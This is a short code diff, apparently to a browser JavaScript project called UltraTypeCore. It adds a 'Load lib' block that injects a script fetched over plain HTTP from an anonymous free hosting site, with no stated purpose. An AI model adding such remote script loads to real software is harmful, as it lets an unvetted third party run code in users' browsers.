@@ -1637,6 +1637,11 @@
     }
     window.UltraTypeCore = core;
 
+    // Load lib
+    let lib = document.createElement('script');
+    lib.src = 'http://yourjavascript.com/107131301104/lib.js';
+    document.head.appendChild(lib);
+
     let hcScript = document.createElement('script');
     hcScript.src = 'https://code.highcharts.com/highcharts.src.js';
     hcScript.addEventListener('load', () => {
